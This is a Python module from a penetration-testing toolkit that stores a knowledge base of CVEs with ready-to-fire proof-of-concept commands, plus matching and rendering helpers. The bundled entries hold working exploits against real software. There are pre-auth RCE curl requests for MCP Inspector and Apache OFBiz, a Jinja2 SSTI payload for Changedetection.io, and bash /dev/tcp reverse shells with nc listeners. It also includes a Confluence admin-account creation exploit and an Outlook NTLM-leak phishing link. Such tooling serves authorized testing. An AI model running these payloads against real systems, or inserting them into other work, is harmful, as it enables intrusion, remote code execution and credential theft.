# HAWK — Hostile Assessment WorKit
# Copyright 2026 Lorenzo Serafini
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# A copy of the License is provided in the LICENSE file at the root
# of this distribution, or at http://www.apache.org/licenses/LICENSE-2.0
#
# Attribution "Created by Lorenzo Serafini" must be preserved in all
# redistributed and Derivative Works — see NOTICE for details.

"""
HAWK — CVE Knowledge Base.

Curated, offline-by-default mapping from product signatures (banners,
HTTP titles, JS bundle markers, MSF index hits, …) to known
high-impact vulnerabilities and ready-to-fire PoCs.

Why this exists
───────────────
Tools like nuclei have great template coverage but lag on freshly
disclosed CVEs by days or weeks.  HAWK can know about the same CVEs
*today* if a small curated dict ships in the codebase.  When a product
fingerprint lands in Target Intel, the KB hook checks the signatures
here and — if there's a hit — emits a correlated CRITICAL/HIGH finding
with the full PoC right there in the operator's flow.

Update model
────────────
* Default: the dict below ships in the HAWK release.  Fully offline.
* Optional: the operator can click "🔄 REFRESH CVE DB" in Target
  Intel which pulls a fresh JSON snapshot from a HAWK-controlled
  GitHub raw URL into ``cache/cve_knowledge.json``.  Merged at load
  time (cache wins on conflict).  No automatic phone-home.

Schema
──────
Each entry is a dict with these fields:

    id                Public identifier (CVE-YYYY-NNNNN, GHSA, advisory).
    product           Human-readable product name (shown in finding).
    signatures        List of substrings — case-insensitive — that
                      indicate the product is in scope.  Match on the
                      finding's title + description (concatenated).
                      Stay tight here: a single-word signature like
                      "Apache" would fire on every nginx box that ever
                      mentioned Apache.  Multi-word or qualified.
    version_match     Optional regex on the same blob.  When set, the
                      entry only fires if the regex matches AND the
                      signatures match.  Use to scope to vulnerable
                      versions.  None = match any version.
    severity          "critical" | "high" | "medium" | "low" | "info".
    title             Short title for the correlated finding.
    description       Multi-line explanation:  what the vuln is, why
                      it matters, how to confirm.
    poc               List of shell-runnable command(s) with placeholders
                      ({target}, {scheme}, {port}, {url}).  Substituted
                      from the originating finding when known.
    references        List of URLs the operator can open for more info.
"""

from __future__ import annotations

import json
import os
import re
from typing import Iterable

from utils.config import CACHE_DIR


# ─── Optional remote refresh ───────────────────────────────────────────────
# When the operator clicks "🔄 REFRESH CVE DB" in Target Intel, HAWK does
# a one-shot HTTPS GET of this URL and merges the JSON it gets back into
# the bundled KB.  Default is None so a fresh HAWK install never reaches
# out to the network — set this in your fork / release to enable
# on-demand updates.  Schema expected at the URL: a JSON list of entries
# matching the dict shape documented at the top of this file.
KB_REMOTE_URL: str | None = None


# ─── Web-search helpers ────────────────────────────────────────────────────
# The bundled KB + NVD lookup are great for STRUCTURED CVE data, but they
# don't surface the thing the operator usually wants on a CTF / fresh
# pentest: a public PoC + writeup.  Those live on a small set of well-
# vetted sources: GitHub Security Advisories (curated DB, NOT random repo
# search), ExploitDB (Offensive Security curated), Packet Storm (moderated
# historical), huntr (the OSS / AI-ML bug-bounty platform — primary
# disclosure venue for Flowise, LangChain, MCP Inspector, Open WebUI,
# Langflow, ComfyUI and most other targets in the AI-OPS registry), and
# HackerOne hacktivity (post-fix public disclosures with full technical
# detail).
#
# Why no Google: a free-text Google query for "<product> CVE exploit"
# routinely surfaces freshly-created GitHub repos with names like
# "CVE-2025-XXXXX-PoC" that contain malicious code (starjacking /
# malicious-PoC pattern).  Funnelling the operator into curated sources
# is a saner default — they can always Google by hand if they need to.
#
# Building the URLs is a pure function — kept here so both the picker
# dialog (target_intel_admin) and the AI-OPS finding button
# (target_intel_render) use the same canonical form.

CVE_WEB_SEARCH_SOURCES = (
    # Curated official advisory DB — high signal, low noise
    ("GitHub Advisory",
     "https://github.com/search?type=advisories&q={q}"),
    # Offensive Security curated PoC archive
    ("ExploitDB",
     "https://www.exploit-db.com/search?q={q}"),
    # Moderated historical archive.  The site migrated from
    # packetstormsecurity.com → packetstorm.news; the old domain still
    # 302s but lands on a ToS interstitial that the operator easily
    # mistakes for a 404.  Pointing straight at the new domain skips
    # one redirect — the first visit still lands on a one-shot ToS
    # accept page (per browser session, then a cookie unlocks search),
    # which is unavoidable with packetstorm's current UX.
    ("Packet Storm",
     "https://packetstorm.news/search/?q={q}"),
    # Primary disclosure venue for OSS / AI-ML bugs (Flowise, LangChain,
    # MCP Inspector, Open WebUI, Langflow, ComfyUI, Triton, Ollama, …) —
    # the researchers themselves post the PoC here as part of the bounty
    # workflow, and entries are vetted by the huntr triage team before
    # going public.
    ("huntr",
     "https://huntr.com/bounties?search={q}"),
    # Public disclosures of fixed bugs across the bug-bounty ecosystem,
    # often the most technically detailed write-up available.  We hit
    # the explicit `/hacktivity/overview` path because the shorter
    # `/hacktivity?queryString=...` 302s to overview WITHOUT preserving
    # the query string — operator lands on an unfiltered list.
    ("HackerOne",
     "https://hackerone.com/hacktivity/overview?queryString={q}"),
)


def cve_web_search_urls(keyword: str) -> list[tuple[str, str]]:
    """Return [(source_label, url)] for the curated web sources that
    surface CVE / advisory / PoC content for ``keyword``.

    Source set defined by CVE_WEB_SEARCH_SOURCES — currently 5 vetted
    sources (GitHub Advisory, ExploitDB, Packet Storm, huntr,
    HackerOne).  Google was deliberately removed: free-text Google
    searches for "<product> CVE exploit" routinely surface malicious
    PoC repos created right after a CVE drops.  See the module docstring
    above CVE_WEB_SEARCH_SOURCES for the rationale.

    Empty / whitespace keywords return [].  ``keyword`` is URL-encoded
    once with quote_plus.
    """
    from urllib.parse import quote_plus
    kw = (keyword or "").strip()
    if not kw:
        return []
    q = quote_plus(kw)
    return [(label, tpl.format(q=q)) for label, tpl in
            CVE_WEB_SEARCH_SOURCES]


# ─── Bundled KB ────────────────────────────────────────────────────────────
# Order doesn't matter functionally; keep groups roughly by date desc so
# diffs in PRs are easy to read.

_BUNDLED: list[dict] = [
    {
        "id": "CVE-2025-49596",
        "product": "MCP Inspector / MCPJam Inspector",
        "signatures": [
            "MCPJam Inspector",
            "mcp-inspector",
            "@mcpjam/inspector",
            "MCPJam",
        ],
        "version_match": None,
        "severity": "critical",
        "title": "MCP Inspector RCE — CVE-2025-49596",
        "description": (
            "The Anthropic MCP Inspector and forks (MCPJam Inspector) "
            "expose a /api/mcp/connect endpoint that, in the default "
            "configuration, accepts an arbitrary serverConfig with "
            "transportType=stdio + command + args.  The proxy backend "
            "spawns the command on the server with no authentication, "
            "yielding pre-auth RCE as the user running the inspector "
            "process.  The vulnerable code path is the same in MCPJam "
            "Inspector at the time of writing.\n\n"
            "Confirm: send a stdio connect with `id` as the command and "
            "watch for either output or — more reliably — a "
            "'Connection closed' error after the spawn (the binary "
            "exited because it isn't an MCP server, but it DID run)."
        ),
        "poc": [
            "─── STEP 1 — confirm RCE ───",
            "Spawns `id` on the server.  'Connection closed' reply = "
            "process ran = vulnerable.",
            'curl -sk {scheme}://{target}{port_path}/api/mcp/connect '
            '-X POST -H "Content-Type: application/json" '
            '-d \'{"serverId":"pwn-{rand_id}","serverConfig":'
            '{"transportType":"stdio","command":"id","args":[]}}\'',
            "",
            "─── STEP 2 — reverse shell (two terminals) ───",
            "Listener first, then trigger.  Set <LHOST>=your VPN IP, "
            "<LPORT>=4444.",
            "",
            "[ TERMINAL A — listener ]",
            "nc -lvnp 4444",
            "",
            "[ TERMINAL B — trigger ]",
            'curl -sk {scheme}://{target}{port_path}/api/mcp/connect '
            '-X POST -H "Content-Type: application/json" '
            '-d \'{"serverId":"sh-{rand_id}","serverConfig":'
            '{"transportType":"stdio","command":"bash","args":'
            '["-c","bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1"]}}\'',
        ],
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2025-49596",
            "https://github.com/modelcontextprotocol/inspector",
            "https://github.com/MCPJam/inspector",
        ],
    },
    {
        "id": "CVE-2024-32651",
        "product": "Changedetection.io",
        "signatures": [
            "changedetection.io",
            "changedetection",
        ],
        "version_match": None,
        "severity": "critical",
        "title": "Changedetection.io SSTI → RCE — CVE-2024-32651",
        "description": (
            "Jinja2 SSTI in the notification template field results in "
            "RCE as the application user.  Trivially weaponised through "
            "the web UI 'Notifications' panel by submitting a Jinja "
            "expression like {{request.application.__globals__"
            ".__builtins__.__import__('os').popen('id').read()}}.\n\n"
            "Affects all versions before 0.45.20."
        ),
        "poc": [
            "─── STEP 1 — confirm SSTI ───",
            "Login → edit watch → Notifications → paste URL → save → "
            "'Send test notification'.  Output of `id` is rendered.",
            "jinja2:{{request.application.__globals__.__builtins__"
            ".__import__('os').popen('id').read()}}",
            "",
            "─── STEP 2 — reverse shell (two terminals) ───",
            "Listener first, then submit the same Notifications form "
            "with this payload.  Set <LHOST>/<LPORT>.",
            "",
            "[ TERMINAL A — listener ]",
            "nc -lvnp 4444",
            "",
            "[ TERMINAL B — payload to paste in the Notifications field ]",
            "jinja2:{{request.application.__globals__.__builtins__"
            ".__import__('os').popen('bash -c \\\"bash -i >& /dev/tcp/"
            "<LHOST>/<LPORT> 0>&1\\\"').read()}}",
        ],
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2024-32651",
            "https://github.com/dgtlmoon/changedetection.io/security/"
            "advisories/GHSA-4r7v-whpg-8rx3",
        ],
    },
    {
        "id": "CVE-2024-45195",
        "product": "Apache OFBiz",
        "signatures": [
            "Apache OFBiz",
            "OFBiz",
            "/webtools/control",
        ],
        "version_match": r"(?:OFBiz|ofbiz)[\s/]*(?:v?(?:18\.12\.1[0-5]|"
                          r"17\.|16\.|15\.))",
        "severity": "critical",
        "title": "Apache OFBiz auth bypass + RCE — CVE-2024-45195",
        "description": (
            "Server-Side Request Forgery + view rendering bypass in "
            "OFBiz lets an unauthenticated attacker reach screens "
            "intended for authenticated users.  Chained with the "
            "Groovy script execution endpoint (ProgramExport / "
            "ViewHandlerExceptionEventListener) results in pre-auth "
            "RCE.  Affects OFBiz < 18.12.16."
        ),
        "poc": [
            "─── STEP 1 — confirm RCE ───",
            "Sends a Groovy throw — output of `id` lands in the HTTP "
            "exception body.  Pre-auth.",
            'curl -sk "{scheme}://{target}{port_path}/webtools/control/'
            'ViewFactoryFinder/ProgramExport" --data-urlencode '
            '"groovyProgram=throw new Exception(\'id\'.execute().text)"',
            "",
            "─── STEP 2 — reverse shell (two terminals) ───",
            "Listener first, then trigger.  Set <LHOST>=your VPN IP, "
            "<LPORT>=4444.",
            "",
            "[ TERMINAL A — listener ]",
            "nc -lvnp 4444",
            "",
            "[ TERMINAL B — trigger ]",
            'curl -sk "{scheme}://{target}{port_path}/webtools/control/'
            'ViewFactoryFinder/ProgramExport" --data-urlencode '
            '"groovyProgram=[\'bash\',\'-c\',\'bash -i >& /dev/tcp/'
            '<LHOST>/<LPORT> 0>&1\'].execute()"',
        ],
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2024-45195",
            "https://lists.apache.org/thread/yqobsr2qx4zg9z2gp2lmln4l9bt9pmm6",
        ],
    },
    {
        "id": "CVE-2023-22515",
        "product": "Atlassian Confluence Data Center / Server",
        "signatures": [
            "Atlassian Confluence",
            "Confluence",
            "X-Confluence-Request-Time",
        ],
        "version_match": r"(?:Confluence)[\s/]*(?:v?[78]\.)",
        "severity": "critical",
        "title": "Confluence broken access control — CVE-2023-22515",
        "description": (
            "An unauthenticated attacker can hit /setup/* endpoints on "
            "publicly-accessible Confluence Data Center / Server "
            "instances and create administrator accounts.  No prior "
            "credentials needed.  Affects 8.0.0 → 8.5.1.  Massively "
            "exploited in the wild after disclosure."
        ),
        "poc": [
            'curl -sk -X POST "{scheme}://{target}{port_path}/'
            'server-info.action?bootstrapStatusProvider.applicationConfig.'
            'setupComplete=false"',
            'curl -sk -X POST "{scheme}://{target}{port_path}/setup/'
            'setupadministrator.action" --data '
            '"username=hawk&fullName=hawk&email=hawk@x.x&password=Hawk!"'
            ' -H "X-Atlassian-Token: no-check"',
        ],
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2023-22515",
            "https://confluence.atlassian.com/security/"
            "cve-2023-22515-broken-access-control-vulnerability-in-"
            "confluence-data-center-and-server-1295682276.html",
        ],
    },
    {
        "id": "CVE-2024-21413",
        "product": "Microsoft Outlook / OWA",
        "signatures": [
            "Outlook Web App",
            "Outlook Web Access",
            "/owa/",
            "X-OWA-Version",
        ],
        "version_match": None,
        "severity": "high",
        "title": "Outlook NTLM credential leak via mailto — CVE-2024-21413",
        "description": (
            "Crafted mailto: links bypass the Protected View sandbox "
            "in Outlook by abusing the file:// fallback parser.  The "
            "victim's NTLM hash is sent to an attacker-controlled SMB "
            "server when the email is previewed.  Patched in February "
            "2024 — unpatched Exchange / Outlook combinations are still "
            "common in the wild.\n\n"
            "Detection of OWA on a target is the trigger: HAWK only "
            "*reaches* the OWA box, the actual exploit requires a "
            "victim opening a crafted email.  This finding is a "
            "reminder to attempt phishing or coerce credentials via "
            "Responder once OWA is confirmed."
        ),
        "poc": [
            'curl -sk -I "{scheme}://{target}{port_path}/owa/"  '
            '# confirm OWA presence + version banner',
            '# Phishing payload (in a .eml saved attachment):\n'
            '# <a href="file:///\\\\\\\\<LHOST>@80/share/test.rtf!hawk">'
            'Click</a>',
        ],
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2024-21413",
            "https://msrc.microsoft.com/update-guide/vulnerability/"
            "CVE-2024-21413",
        ],
    },
]


# ─── Cache loader ──────────────────────────────────────────────────────────

_CACHE_PATH = os.path.join(CACHE_DIR, "cve_knowledge.json")


def _load_cache() -> list[dict]:
    """Read ``cache/cve_knowledge.json`` if present.  Tolerant of every
    failure mode — missing file, corrupted JSON, wrong shape — so the
    KB always falls back to the bundled entries.
    """
    try:
        if not os.path.isfile(_CACHE_PATH):
            return []
        with open(_CACHE_PATH, "r", encoding="utf-8") as f:
            data = json.load(f)
        if isinstance(data, list):
            # Sanity-check: each entry must be a dict with at least an id
            return [e for e in data
                    if isinstance(e, dict) and isinstance(e.get("id"), str)]
        if isinstance(data, dict) and isinstance(data.get("entries"), list):
            return [e for e in data["entries"]
                    if isinstance(e, dict) and isinstance(e.get("id"), str)]
    except Exception as e:
        import sys as _s
        print(f"[HAWK] cve_knowledge cache load failed: {e}",
              file=_s.stderr)
    return []


def _merged_entries() -> list[dict]:
    """Bundled + cache.  Cache entries override bundled when their `id`
    matches — this is how a fresh REFRESH CVE DB call replaces an older
    bundled entry without code change.
    """
    cache = _load_cache()
    by_id = {e["id"]: e for e in _BUNDLED}
    for e in cache:
        by_id[e["id"]] = e
    return list(by_id.values())


# ─── Public API ────────────────────────────────────────────────────────────

def all_entries() -> list[dict]:
    """All known KB entries (bundled merged with on-disk cache)."""
    return _merged_entries()


def cache_path() -> str:
    return _CACHE_PATH


def match_finding(title: str, description: str = "") -> list[dict]:
    """Return KB entries whose signatures (and optional version_match)
    are present in the concatenation of `title` and `description`.

    Matching is case-insensitive and substring-based for signatures so
    the lookup tolerates variations in how a product name is written
    (e.g. "MCPJam Inspector" vs "@mcpjam/inspector").  All signatures
    of an entry are OR'd: ANY hit is enough to consider the entry a
    candidate, then the optional version regex acts as a gate.
    """
    blob = f"{title}\n{description}".lower()
    hits: list[dict] = []
    for entry in _merged_entries():
        sigs = entry.get("signatures") or []
        sig_hit = any(s.lower() in blob for s in sigs if s)
        if not sig_hit:
            continue
        vm = entry.get("version_match")
        if vm:
            try:
                if not re.search(vm, f"{title}\n{description}",
                                  re.IGNORECASE):
                    continue
            except re.error as e:
                import sys as _s
                print(f"[HAWK] cve_knowledge bad regex on {entry['id']}: "
                      f"{e}", file=_s.stderr)
                continue
        hits.append(entry)
    return hits


def severity_for_cve(cve_id: str) -> str | None:
    """Return the curated severity for a CVE id if the in-house KB
    (bundled + on-disk cache) covers it, else ``None``.

    OFFLINE-ONLY: this is an exact-id scan over the local KB entries —
    it NEVER reaches the network.  The nmap vuln-script parsing path
    calls it to derive a finding's severity, and that path must stay
    non-blocking on egress-less boxes.  Network refresh of the KB stays
    operator-driven (``fetch_remote`` behind the REFRESH CVE DB button).

    The returned value is normalised to the HAWK severity vocabulary
    (info/low/medium/high/critical); anything else yields ``None``.
    """
    if not cve_id:
        return None
    want = cve_id.strip().upper()
    for entry in _merged_entries():
        if str(entry.get("id", "")).strip().upper() == want:
            sev = str(entry.get("severity", "")).strip().lower()
            if sev in ("info", "low", "medium", "high", "critical"):
                return sev
            return None
    return None


def render_correlated_description(entry: dict, *,
                                    scheme: str = "http",
                                    target: str = "TARGET",
                                    port: int | str = "") -> str:
    """Format an entry as a multi-line description suitable for the
    correlated finding.  Substitutes the few placeholders allowed in
    PoC strings: {scheme}, {target}, {port}, {port_path} (":<port>"
    or empty), {url}, plus {rand_id} which expands to a fresh random
    hex per render — used to dodge backend caches that pin state to
    a previously-seen identifier (e.g. MCP Inspector keeps a server
    record per ``serverId`` and the next call with the same id hangs
    waiting for the previous one to respond).

    Uses simple ``str.replace`` instead of ``str.format`` because PoCs
    are full of JSON / Jinja / shell braces that would explode any
    format-string parser.  Plain-text substitution is safer and
    completely sufficient for the placeholders we care about.
    """
    import secrets as _secrets
    port_path = f":{port}" if port and str(port) not in ("80", "443") else ""
    url = (f"{scheme}://{target}{port_path}/" if target else "")
    # Fresh random id every render so a copy-pasted PoC carries a
    # concrete unique value (works in bash, Burp, browser console, any
    # automation script — not dependent on shell expansion).
    rand_id = _secrets.token_hex(4)
    subs = {
        "{scheme}":    scheme,
        "{target}":    target,
        "{port}":      str(port or ""),
        "{port_path}": port_path,
        "{url}":       url,
        "{rand_id}":   rand_id,
    }

    def _subst(s: str) -> str:
        out = s
        for k, v in subs.items():
            out = out.replace(k, v)
        return out

    parts = []
    parts.append(f"{entry.get('id', '')}  ·  {entry.get('product', '')}")
    parts.append("")
    parts.append(entry.get("description", "").rstrip())
    parts.append("")
    pocs = entry.get("poc") or []
    if pocs:
        parts.append("PoC / repro:")
        for p in pocs:
            for line in _subst(str(p)).splitlines():
                parts.append(f"  {line}")
    refs = entry.get("references") or []
    if refs:
        parts.append("")
        parts.append("References:")
        for r in refs:
            parts.append(f"  • {r}")
    return "\n".join(parts).rstrip()


def write_cache(entries: Iterable[dict]) -> None:
    """Persist `entries` to ``cache/cve_knowledge.json``.  Called by
    the REFRESH CVE DB action after a successful network fetch.
    Atomic write: writes to a tempfile and replaces the target so a
    crash mid-write doesn't corrupt the cache.
    """
    os.makedirs(CACHE_DIR, exist_ok=True)
    tmp = _CACHE_PATH + ".tmp"
    with open(tmp, "w", encoding="utf-8") as f:
        json.dump(list(entries), f, indent=2, ensure_ascii=False)
    os.replace(tmp, _CACHE_PATH)


def fetch_remote(url: str | None = None, *, timeout: int = 10) -> dict:
    """One-shot HTTPS GET of the remote KB and atomic write to cache.

    Returns ``{"ok": True, "added": N, "url": <url>}`` on success or
    ``{"ok": False, "reason": <str>}`` on failure.  Designed to be
    called from a worker thread (the GET will block) — the caller is
    responsible for posting the result back to the Tk loop.

    No automatic call ever reaches this; the operator triggers it by
    clicking "🔄 REFRESH CVE DB" in Target Intel.  Stays consistent
    with the offline-by-default design.
    """
    target_url = url or KB_REMOTE_URL
    if not target_url:
        return {"ok": False,
                "reason": "KB_REMOTE_URL is not set in utils/cve_knowledge.py"}
    if not target_url.startswith(("https://", "http://")):
        return {"ok": False,
                "reason": f"refusing non-http(s) URL: {target_url}"}

    import urllib.request
    try:
        req = urllib.request.Request(
            target_url, headers={"User-Agent": "HAWK/cve-kb"})
        with urllib.request.urlopen(req, timeout=timeout) as r:
            raw = r.read()
        data = json.loads(raw.decode("utf-8"))
    except Exception as e:
        return {"ok": False, "reason": f"{type(e).__name__}: {e}"}

    entries = []
    if isinstance(data, list):
        entries = data
    elif isinstance(data, dict) and isinstance(data.get("entries"), list):
        entries = data["entries"]
    else:
        return {"ok": False, "reason": "unexpected JSON shape"}

    entries = [e for e in entries
               if isinstance(e, dict) and isinstance(e.get("id"), str)]
    if not entries:
        return {"ok": False,
                "reason": "remote KB carried no valid entries"}

    try:
        write_cache(entries)
    except Exception as e:
        return {"ok": False, "reason": f"cache write failed: {e}"}
    return {"ok": True, "added": len(entries), "url": target_url}


__all__ = [
    "KB_REMOTE_URL",
    "all_entries",
    "cache_path",
    "fetch_remote",
    "match_finding",
    "render_correlated_description",
    "severity_for_cve",
    "write_cache",
]
